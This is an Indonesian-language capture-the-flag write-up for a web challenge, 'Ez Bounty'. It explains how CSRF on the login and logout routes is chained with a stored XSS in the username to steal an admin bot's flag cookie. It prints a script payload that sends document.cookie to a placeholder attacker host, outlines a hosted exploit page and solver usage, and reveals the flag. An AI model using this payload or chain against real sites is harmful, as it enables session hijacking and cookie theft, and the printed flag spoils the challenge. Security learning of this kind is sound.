# Writeup - Ez Bounty

Challenge: **Ez Bounty**  
Kategori: **Web**

## Ringkasan Kerentanan
Aplikasi punya dua isu yang bisa dirangkai:

1. **CSRF di `/logout` dan `/login`**
- Tidak ada token CSRF.
- Cookie session diset dengan `SameSite=None`, jadi request cross-site tetap membawa cookie.
- `/logout` pakai GET, jadi bisa dipicu lewat `<img src=...>`.

2. **Stored XSS di dashboard**
- Username dirender dengan `{{ username | safe }}` di `templates/dashboard.html`.
- Artinya HTML/JS dari username dieksekusi saat halaman dashboard dibuka.

## Analisis Source Kunci
Di `app.py`:
- Bot login sebagai admin.
- Setelah login, bot set cookie `flag` (`httpOnly=False`, `sameSite=None`, `secure=True`).
- Lalu bot membuka URL yang kita submit ke `/report`.

Karena cookie `flag` tidak HttpOnly, JavaScript bisa baca `document.cookie`.

## Rantai Eksploitasi
1. Buat akun dengan username berisi XSS:
```html
<script>new Image().src='https://ATTACKER/x?c='+encodeURIComponent(document.cookie)</script>
```

2. Host halaman `exploit.html` di domain publik attacker. Isinya:
- Trigger `GET /logout` (biar admin logout).
- Auto-submit form POST ke `/login` dengan credential akun XSS tadi.

3. Submit URL `exploit.html` ke `/report`.

4. Bot admin membuka halaman attacker:
- session admin logout,
- login sebagai akun XSS,
- redirect ke `/dashboard`,
- XSS jalan dan kirim `document.cookie` ke endpoint attacker.

5. Dari callback, ambil nilai cookie `flag`.

## Flag
`KSUS{moneyless_iframe_baby}`

## Solver
File solver: `solver.py`

Script ini mengotomasi:
- pendaftaran user payload XSS,
- pendaftaran user pelapor,
- submit report,
- serve `/exploit.html` dan endpoint `/x` lokal,
- parsing flag dari callback.

### Cara pakai
1. Aktifkan venv:
```bash
source /home/nata/ctf_env/bin/activate
```

2. Jalankan tunnel ke port lokal 8000 (contoh ngrok):
```bash
ngrok http 8000
```

3. Ambil URL publik ngrok, lalu jalankan solver:
```bash
python3 solver.py --public-url https://YOUR-NGROK-DOMAIN
```

4. Jika berhasil, output berisi:
```text
<FLAG>...</FLAG>
```

## Catatan Teknis
- Challenge minta Chromium-based karena bot memakai Chrome headless (`pyppeteer` + `google-chrome-stable`).
- Beberapa skema URL seperti `javascript:`/`data:` tidak selalu reliable di konteks ini, jadi chain paling stabil adalah halaman attacker publik + CSRF login + stored XSS.
